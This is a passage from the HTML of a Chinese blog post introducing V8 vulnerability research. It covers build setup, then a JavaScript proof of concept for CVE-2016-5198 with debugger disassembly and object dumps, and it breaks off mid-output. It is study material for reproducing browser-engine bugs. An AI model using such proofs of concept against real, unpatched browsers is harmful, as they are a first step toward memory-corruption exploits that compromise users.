@@ -1,0 +1,664 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-Hans" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/pisanbao.jpg">
+  <link rel="icon" href="/img/pisanbao.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="皮三宝">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="从0到1，去年5月复现过几个漏洞现在全忘了，重新写下方便以后复习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="v8入门">
+<meta property="og:url" content="http://www.psbazx.com/2022/03/21/v8%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="皮三宝のBlog">
+<meta property="og:description" content="从0到1，去年5月复现过几个漏洞现在全忘了，重新写下方便以后复习。">
+<meta property="og:locale">
+<meta property="og:image" content="http://www.psbazx.com/2022/03/21/v8%E5%85%A5%E9%97%A8/image-20220321150645517.png">
+<meta property="og:image" content="http://www.psbazx.com/2022/03/21/v8%E5%85%A5%E9%97%A8/image-20220322161721309.png">
+<meta property="og:image" content="http://www.psbazx.com/2022/03/21/v8%E5%85%A5%E9%97%A8/image-20220322164501837.png">
+<meta property="og:image" content="http://www.psbazx.com/2022/03/21/v8%E5%85%A5%E9%97%A8/image-20220322192002609.png">
+<meta property="og:image" content="http://www.psbazx.com/2022/03/21/v8%E5%85%A5%E9%97%A8/image-20220323234945957.png">
+<meta property="og:image" content="http://www.psbazx.com/2022/03/21/v8%E5%85%A5%E9%97%A8/image-20220323235218771.png">
+<meta property="og:image" content="http://www.psbazx.com/2022/03/21/v8%E5%85%A5%E9%97%A8/image-20220323235757727.png">
+<meta property="article:published_time" content="2022-03-21T14:52:21.000Z">
+<meta property="article:modified_time" content="2024-07-22T01:48:18.135Z">
+<meta property="article:author" content="皮三宝">
+<meta property="article:tag" content="v8">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://www.psbazx.com/2022/03/21/v8%E5%85%A5%E9%97%A8/image-20220321150645517.png">
+  
+  
+  
+  <title>v8入门 - 皮三宝のBlog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.psbazx.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>pisanbao</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                主页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/1.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="v8入门"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-03-21 14:52" pubdate>
+          March 21, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k wörter
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          95 minuten
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">v8入门</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>从0到1，去年5月复现过几个漏洞现在全忘了，重新写下方便以后复习。</p>
+<a id="more"></a>
+
+<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>因为之前是在公司里配置的没有考虑过代理的问题直接可以访问，自己配置的时候需要配置下代理</p>
+<p>我这边用的是clash，需要注意启动时候sudo权限</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">git<span class="hljs-built_in"> config </span>--global http.proxy 127.0.0.1:7890<br>gedit ~/.bashrc<br><span class="hljs-comment">#在最后加上</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">http_proxy</span>=<span class="hljs-string">&quot;127.0.0.1:7890&quot;</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">https_proxy</span>=<span class="hljs-variable">$http_proxy</span><br></code></pre></td></tr></table></figure>
+<p>下面安装下depot_tools和ninja即可</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">git clone https:<span class="hljs-string">//chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="hljs-keyword">echo</span> &#x27;export PATH=$PATH:<span class="hljs-string">&quot;/home/pisanbao/v8/v8/depot_tools&quot;</span>&#x27; &gt;&gt; ~<span class="hljs-string">/.bashrc</span><br>git clone https:<span class="hljs-string">//github.com/ninja-build/ninja.git</span><br><span class="hljs-keyword">cd</span> ninja<br><span class="hljs-string">./configure.py</span> <span class="hljs-params">--bootstrap</span> <br><span class="hljs-keyword">cd</span> <span class="hljs-string">..</span><br><span class="hljs-keyword">echo</span> &#x27;export PATH=$PATH:<span class="hljs-string">&quot;/home/pisanbao/v8/ninja&quot;</span>&#x27; &gt;&gt; ~<span class="hljs-string">/.bashrc</span><br></code></pre></td></tr></table></figure>
+<p>接下去fetch v8然后编译</p>
+<p>//报command not found就起bash</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fetch</span> v<span class="hljs-number">8</span><br><span class="hljs-attribute">cd</span> v<span class="hljs-number">8</span><br><span class="hljs-attribute">git</span> checkout 版本号<br><span class="hljs-attribute">gclient</span> sync<br><br><span class="hljs-attribute">tools</span>/dev/v<span class="hljs-number">8</span>gen.py x<span class="hljs-number">64</span>.debug<br><span class="hljs-attribute">ninja</span> -C out.gn/x<span class="hljs-number">64</span>.debug<br><span class="hljs-comment">#release版本吧debug改成release即可</span><br><span class="hljs-comment">#如果是32位吧x64改成ia32即可</span><br></code></pre></td></tr></table></figure>
+<p>接着修改下gdbinit，为了方便调试</p>
+<p><img src="image-20220321150645517.png" srcset="/img/loading.gif" lazyload alt="image-20220321150645517"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">v<span class="hljs-number">8</span>提供了一些指令方便调试<br>使用<span class="hljs-variable">%DebugPrint</span>(<span class="hljs-keyword">x</span>)<span class="hljs-comment">;来输出变量x的相关信息</span><br>使用<span class="hljs-variable">%SystemBreak</span>()<span class="hljs-comment">;来抛出int3，以便让gdb进行调试</span><br>./d<span class="hljs-number">8</span> --allow-natives-syntax exp.js<br>#参数--allow-natives-syntax记得加上<br></code></pre></td></tr></table></figure>
+<h1 id="CVE-2016-5198"><a href="#CVE-2016-5198" class="headerlink" title="CVE-2016-5198"></a>CVE-2016-5198</h1><p><a target="_blank" rel="noopener" href="https://eternalsakura13.com/2019/04/29/CVE-2016-5198/#more">https://eternalsakura13.com/2019/04/29/CVE-2016-5198/#more</a></p>
+<p>具体可以看sakura的blog，写的特棒，当初也是看这个入门的。</p>
+<p>这个漏洞也是比较经典的利用</p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Ctor</span>(<span class="hljs-params"></span>) </span>&#123;<br>    n = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Set</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Check</span>(<span class="hljs-params"></span>) </span>&#123;<br>    n.xyz = <span class="hljs-number">0x826852f4</span>;<br>    <span class="hljs-built_in">parseInt</span>(<span class="hljs-string">&#x27;AAAAAAAA&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">2000</span>; ++i) &#123;<br>    Ctor();<br>&#125;<br><br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">2000</span>; ++i) &#123;<br>    Check();<br>&#125;<br><br>Ctor();<br>Check();<br>print(<span class="hljs-string">&quot;finish&quot;</span>);<br></code></pre></td></tr></table></figure>
+<p>具体配合调试来看，优化后的check如下</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; job <span class="hljs-number">0</span>xea<span class="hljs-number">1</span>bd<span class="hljs-number">606</span>f<span class="hljs-number">21</span><br><span class="hljs-attribute">0xea1bd606f21</span>:<span class="hljs-meta"> [Code]</span><br><span class="hljs-attribute">kind</span> = OPTIMIZED_FUNCTION<br><span class="hljs-attribute">stack_slots</span> = <span class="hljs-number">5</span><br><span class="hljs-attribute">compiler</span> = crankshaft<br><span class="hljs-attribute">Instructions</span> (size = <span class="hljs-number">186</span>)<br><span class="hljs-attribute">0xea1bd606f80</span>     <span class="hljs-number">0</span>  <span class="hljs-number">55</span>             push rbp<br><span class="hljs-attribute">0xea1bd606f81</span>     <span class="hljs-number">1</span>  <span class="hljs-number">4889</span>e<span class="hljs-number">5</span>         REX.W movq rbp,rsp<br><span class="hljs-attribute">0xea1bd606f84</span>     <span class="hljs-number">4</span>  <span class="hljs-number">56</span>             push rsi<br><span class="hljs-attribute">0xea1bd606f85</span>     <span class="hljs-number">5</span>  <span class="hljs-number">57</span>             push rdi<br><span class="hljs-attribute">0xea1bd606f86</span>     <span class="hljs-number">6</span>  <span class="hljs-number">4883</span>ec<span class="hljs-number">08</span>       REX.W subq rsp,<span class="hljs-number">0</span>x<span class="hljs-number">8</span><br><span class="hljs-attribute">0xea1bd606f8a</span>    <span class="hljs-number">10</span>  <span class="hljs-number">488</span>b<span class="hljs-number">45</span>f<span class="hljs-number">8</span>       REX.W movq rax,[rbp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">0xea1bd606f8e</span>    <span class="hljs-number">14</span>  <span class="hljs-number">488945</span>e<span class="hljs-number">8</span>       REX.W movq<span class="hljs-meta"> [rbp-0x18],rax</span><br><span class="hljs-meta">0xea1bd606f92    18  488bf0         REX.W movq rsi,rax</span><br><span class="hljs-meta">0xea1bd606f95    21  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="hljs-attribute">0xea1bd606f9c</span>    <span class="hljs-number">28</span>  <span class="hljs-number">7305</span>           jnc <span class="hljs-number">35</span>  (<span class="hljs-number">0</span>xea<span class="hljs-number">1</span>bd<span class="hljs-number">606</span>fa<span class="hljs-number">3</span>)<br><span class="hljs-attribute">0xea1bd606f9e</span>    <span class="hljs-number">30</span>  e<span class="hljs-number">83</span>db<span class="hljs-number">9</span>f<span class="hljs-number">5</span>ff     call StackCheck  (<span class="hljs-number">0</span>xea<span class="hljs-number">1</span>bd<span class="hljs-number">5628</span>e<span class="hljs-number">0</span>)    ;; code: BUILTIN<br><span class="hljs-attribute">0xea1bd606fa3</span>    <span class="hljs-number">35</span>  <span class="hljs-number">48</span>b<span class="hljs-number">821</span>c<span class="hljs-number">09</span>aff<span class="hljs-number">94310000</span> REX.W movq rax,<span class="hljs-number">0</span>x<span class="hljs-number">3194</span>ff<span class="hljs-number">9</span>ac<span class="hljs-number">021</span>    ;; object: <span class="hljs-number">0</span>x<span class="hljs-number">3194</span>ff<span class="hljs-number">9</span>ac<span class="hljs-number">021</span> PropertyCell for <span class="hljs-number">0</span>x<span class="hljs-number">29139</span>a<span class="hljs-number">15</span>c<span class="hljs-number">631</span> &lt;a Set with map <span class="hljs-number">0</span>x<span class="hljs-number">3</span>a<span class="hljs-number">202</span>ca<span class="hljs-number">86509</span>&gt;<br><span class="hljs-attribute">0xea1bd606fad</span>    <span class="hljs-number">45</span>  <span class="hljs-number">488</span>b<span class="hljs-number">400</span>f       REX.W movq rax,[rax+<span class="hljs-number">0</span>xf]<br><span class="hljs-attribute">0xea1bd606fb1</span>    <span class="hljs-number">49</span>  <span class="hljs-number">49</span>ba<span class="hljs-number">0000805</span>e<span class="hljs-number">0</span>a<span class="hljs-number">4</span>de<span class="hljs-number">041</span> REX.W movq r<span class="hljs-number">10</span>,<span class="hljs-number">0</span>x<span class="hljs-number">41</span>e<span class="hljs-number">04</span>d<span class="hljs-number">0</span>a<span class="hljs-number">5</span>e<span class="hljs-number">800000</span><br><span class="hljs-attribute">0xea1bd606fbb</span>    <span class="hljs-number">59</span>  c<span class="hljs-number">4</span>c<span class="hljs-number">1</span>f<span class="hljs-number">96</span>ec<span class="hljs-number">2</span>     vmovq xmm<span class="hljs-number">0</span>,r<span class="hljs-number">10</span><br><span class="hljs-attribute">0xea1bd606fc0</span>    <span class="hljs-number">64</span>  <span class="hljs-number">488</span>b<span class="hljs-number">4007</span>       REX.W movq rax,[rax+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>]<br><span class="hljs-attribute">0xea1bd606fc4</span>    <span class="hljs-number">68</span>  <span class="hljs-number">488</span>b<span class="hljs-number">400</span>f       REX.W movq rax,[rax+<span class="hljs-number">0</span>xf]<br><span class="hljs-attribute">0xea1bd606fc8</span>    <span class="hljs-number">72</span>  c<span class="hljs-number">5</span>fb<span class="hljs-number">114007</span>     vmovsd<span class="hljs-meta"> [rax+0x7],xmm0</span><br><span class="hljs-meta">0xea1bd606fcd    77  49ba112358a9d43b0000 REX.W movq r10,0x3bd4a9582311    ;; object: 0x3bd4a9582311 &lt;undefined&gt;</span><br><span class="hljs-meta">0xea1bd606fd7    87  4152           push r10</span><br><span class="hljs-meta">0xea1bd606fd9    89  49ba39b09aff94310000 REX.W movq r10,0x3194ff9ab039    ;; object: 0x3194ff9ab039 &lt;String[8]: AAAAAAAA&gt;</span><br><span class="hljs-meta">0xea1bd606fe3    99  4152           push r10</span><br><span class="hljs-meta">0xea1bd606fe5   101  48bf51d898ff94310000 REX.W movq rdi,0x3194ff98d851    ;; object: 0x3194ff98d851 &lt;JS Function parseInt (SharedFunctionInfo 0x3bd4a95bce11)&gt;</span><br><span class="hljs-meta">0xea1bd606fef   111  488b75e8       REX.W movq rsi,[rbp-0x18]</span><br><span class="hljs-attribute">0xea1bd606ff3</span>   <span class="hljs-number">115</span>  <span class="hljs-number">488</span>b<span class="hljs-number">7727</span>       REX.W movq rsi,[rdi+<span class="hljs-number">0</span>x<span class="hljs-number">27</span>]<br><span class="hljs-attribute">0xea1bd606ff7</span>   <span class="hljs-number">119</span>  <span class="hljs-number">498</span>b<span class="hljs-number">55</span>a<span class="hljs-number">0</span>       REX.W movq rdx,[r<span class="hljs-number">13</span>-<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]<br><span class="hljs-attribute">0xea1bd606ffb</span>   <span class="hljs-number">123</span>  b<span class="hljs-number">801000000</span>     movl rax,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">0xea1bd607000</span>   <span class="hljs-number">128</span>  bb<span class="hljs-number">02000000</span>     movl rbx,<span class="hljs-number">0</span>x<span class="hljs-number">2</span><br><span class="hljs-attribute">0xea1bd607005</span>   <span class="hljs-number">133</span>  e<span class="hljs-number">8</span>f<span class="hljs-number">6</span>ebefff     call ArgumentsAdaptorTrampoline  (<span class="hljs-number">0</span>xea<span class="hljs-number">1</span>bd<span class="hljs-number">505</span>c<span class="hljs-number">00</span>)    ;; code: BUILTIN<br><span class="hljs-attribute">0xea1bd60700a</span>   <span class="hljs-number">138</span>  <span class="hljs-number">48</span>b<span class="hljs-number">8112358</span>a<span class="hljs-number">9</span>d<span class="hljs-number">43</span>b<span class="hljs-number">0000</span> REX.W movq rax,<span class="hljs-number">0</span>x<span class="hljs-number">3</span>bd<span class="hljs-number">4</span>a<span class="hljs-number">9582311</span>    ;; object: <span class="hljs-number">0</span>x<span class="hljs-number">3</span>bd<span class="hljs-number">4</span>a<span class="hljs-number">9582311</span> &lt;undefined&gt;<br><span class="hljs-attribute">0xea1bd607014</span>   <span class="hljs-number">148</span>  <span class="hljs-number">488</span>be<span class="hljs-number">5</span>         REX.W movq rsp,rbp<br><span class="hljs-attribute">0xea1bd607017</span>   <span class="hljs-number">151</span>  <span class="hljs-number">5</span>d             pop rbp<br><span class="hljs-attribute">0xea1bd607018</span>   <span class="hljs-number">152</span>  c<span class="hljs-number">20800</span>         ret <span class="hljs-number">0</span>x<span class="hljs-number">8</span><br><span class="hljs-attribute">0xea1bd60701b</span>   <span class="hljs-number">155</span>  <span class="hljs-number">90</span>             nop<br><br><span class="hljs-attribute">Source</span> positions:<br> <span class="hljs-attribute">pc</span> offset  position<br>        <span class="hljs-attribute">77</span>        <span class="hljs-number">87</span><br>        <span class="hljs-attribute">89</span>        <span class="hljs-number">87</span><br>        <span class="hljs-attribute">89</span>        <span class="hljs-number">87</span><br>       <span class="hljs-attribute">101</span>        <span class="hljs-number">87</span><br>       <span class="hljs-attribute">101</span>        <span class="hljs-number">87</span><br>       <span class="hljs-attribute">111</span>        <span class="hljs-number">87</span><br>       <span class="hljs-attribute">115</span>        <span class="hljs-number">87</span><br>       <span class="hljs-attribute">138</span>        <span class="hljs-number">87</span><br>       <span class="hljs-attribute">138</span>        <span class="hljs-number">87</span><br>       <span class="hljs-attribute">138</span>        <span class="hljs-number">87</span><br>       <span class="hljs-attribute">148</span>        <span class="hljs-number">87</span><br>       <span class="hljs-attribute">155</span>        <span class="hljs-number">87</span><br><br><span class="hljs-attribute">Inlined</span> functions (count = <span class="hljs-number">0</span>)<br><br><span class="hljs-attribute">Deoptimization</span> Input Data (deopt points = <span class="hljs-number">2</span>)<br> <span class="hljs-attribute">index</span>  ast id    argc     pc<br>     <span class="hljs-attribute">0</span>       <span class="hljs-number">4</span>       <span class="hljs-number">0</span>     <span class="hljs-number">35</span><br>     <span class="hljs-attribute">1</span>      <span class="hljs-number">21</span>       <span class="hljs-number">0</span>    <span class="hljs-number">138</span><br><br><span class="hljs-attribute">Safepoints</span> (size = <span class="hljs-number">30</span>)<br><span class="hljs-attribute">0xea1bd606fa3</span>    <span class="hljs-number">35</span>  <span class="hljs-number">10000</span> (sp -&gt; fp)       <span class="hljs-number">0</span><br><span class="hljs-attribute">0xea1bd60700a</span>   <span class="hljs-number">138</span>  <span class="hljs-number">10000</span> (sp -&gt; fp)       <span class="hljs-number">1</span><br><br><span class="hljs-attribute">RelocInfo</span> (size = <span class="hljs-number">7</span>)<br><span class="hljs-attribute">0xea1bd606f9f</span>  code target (BUILTIN)  (<span class="hljs-number">0</span>xea<span class="hljs-number">1</span>bd<span class="hljs-number">5628</span>e<span class="hljs-number">0</span>)<br><span class="hljs-attribute">0xea1bd606fa5</span>  embedded object  (<span class="hljs-number">0</span>x<span class="hljs-number">3194</span>ff<span class="hljs-number">9</span>ac<span class="hljs-number">021</span> PropertyCell for <span class="hljs-number">0</span>x<span class="hljs-number">29139</span>a<span class="hljs-number">15</span>c<span class="hljs-number">631</span> &lt;a Set with map <span class="hljs-number">0</span>x<span class="hljs-number">3</span>a<span class="hljs-number">202</span>ca<span class="hljs-number">86509</span>&gt;)<br><span class="hljs-attribute">0xea1bd606fcf</span>  embedded object  (<span class="hljs-number">0</span>x<span class="hljs-number">3</span>bd<span class="hljs-number">4</span>a<span class="hljs-number">9582311</span> &lt;undefined&gt;)<br><span class="hljs-attribute">0xea1bd606fdb</span>  embedded object  (<span class="hljs-number">0</span>x<span class="hljs-number">3194</span>ff<span class="hljs-number">9</span>ab<span class="hljs-number">039</span> &lt;String[<span class="hljs-number">8</span>]: AAAAAAAA&gt;)<br><span class="hljs-attribute">0xea1bd606fe7</span>  embedded object  (<span class="hljs-number">0</span>x<span class="hljs-number">3194</span>ff<span class="hljs-number">98</span>d<span class="hljs-number">851</span> &lt;JS Function parseInt (SharedFunctionInfo <span class="hljs-number">0</span>x<span class="hljs-number">3</span>bd<span class="hljs-number">4</span>a<span class="hljs-number">95</span>bce<span class="hljs-number">11</span>)&gt;)<br><span class="hljs-attribute">0xea1bd607006</span>  code target (BUILTIN)  (<span class="hljs-number">0</span>xea<span class="hljs-number">1</span>bd<span class="hljs-number">505</span>c<span class="hljs-number">00</span>)<br><span class="hljs-attribute">0xea1bd60700c</span>  embedded object  (<span class="hljs-number">0</span>x<span class="hljs-number">3</span>bd<span class="hljs-number">4</span>a<span class="hljs-number">9582311</span> &lt;undefined&gt;)<br></code></pre></td></tr></table></figure>
+<p><img src="image-20220322161721309.png" srcset="/img/loading.gif" lazyload alt="image-20220322161721309"></p>
+<p>断点断下，此时rax是n的地址</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs delphi">DebugPrint: <span class="hljs-number">0</span>x29139a15c631: [JSSet]<br> - map = <span class="hljs-number">0</span>x3a202ca86509 [FastProperties]<br> - prototype = <span class="hljs-number">0</span>x3194ff995e49<br> - elements = <span class="hljs-number">0</span>x3bd4a9582241 &lt;FixedArray[<span class="hljs-number">0</span>]&gt; [FAST_HOLEY_SMI_ELEMENTS] - table = <span class="hljs-number">0</span>x29139a15c651 &lt;FixedArray[<span class="hljs-number">13</span>]&gt;<br> - properties = <span class="hljs-comment">&#123;</span><br><span class="hljs-comment"> &#125;</span><br><span class="hljs-number">0</span>x3a202ca86509: [Map]<br> - <span class="hljs-keyword">type</span>: JS_SET_TYPE<br> - instance size: <span class="hljs-number">32</span><br> - inobject properties: <span 